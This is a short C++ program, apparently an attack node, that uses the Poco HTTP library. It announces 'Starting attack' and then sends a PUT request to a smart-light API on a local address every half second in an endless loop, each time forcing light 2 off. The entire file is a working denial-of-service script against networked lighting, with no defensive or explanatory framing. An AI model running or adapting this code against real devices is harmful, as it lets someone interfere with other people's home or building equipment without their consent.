////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// DMC_NODE
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <iostream>
#include <Poco/Net/HTTPRequest.h>
#include <Poco/Net/HTTPClientSession.h>

using namespace Poco::Net;

int main(int, const char**) {
	
	std::cout << "Starting attack" << std::endl;
	
	HTTPClientSession session("10.100.3.211");
	HTTPRequest cmdOff;
	cmdOff.setMethod("PUT");
	cmdOff.setURI("/api/attack/lights/2/state");
	std::string body = "{\n\t\"on\": false\n}";
	cmdOff.setContentLength(body.size());

	for (;;) {
		session.sendRequest(cmdOff) << body;
		Sleep(500);
	}
	

}